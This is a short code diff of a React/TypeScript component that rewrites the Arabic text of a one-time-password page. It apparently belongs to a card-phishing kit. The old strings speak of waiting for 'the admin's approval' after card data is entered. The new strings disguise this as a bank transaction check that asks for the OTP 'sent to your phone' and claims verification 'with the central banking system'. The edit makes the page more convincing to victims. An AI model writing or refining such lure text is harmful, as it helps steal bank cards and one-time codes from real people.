@@ -6,15 +6,15 @@ import { useWebSocket, broadcast } from "@/context/WebSocketContext";
 import { usePageContent } from "@/hooks/usePageContent";
 
 const DEFAULTS = {
-  page_title: "التحقق بخطوتين",
-  otp_placeholder: "أدخل رمز التحقق",
-  submit_btn: "تحقق من الرمز",
-  waiting_title: "في انتظار الموافقة",
-  waiting_message: "تم إرسال الرمز. في انتظار موافقة المدير...",
-  approved_title: "تمت الموافقة",
-  rejected_title: "رمز غير صحيح",
-  retry_btn: "حاول مرة أخرى",
-  back_btn: "العودة لإدخال بيانات البطاقة",
+  page_title: "تأكيد العملية المصرفية",
+  otp_placeholder: "أدخل رمز التحقق (OTP) المرسل لهاتفك",
+  submit_btn: "إتمام التأكيد",
+  waiting_title: "جاري المعالجة",
+  waiting_message: "نحن نقوم بالتحقق من صحة الرمز مع النظام البنكي المركزي. يرجى الانتظار...",
+  approved_title: "تم قبول الرمز",
+  rejected_title: "الرمز غير صالح",
+  retry_btn: "إعادة المحاولة",
+  back_btn: "الرجوع لتعديل بيانات البطاقة",
 };
 
 function getQueryParam(key: string): string | null {
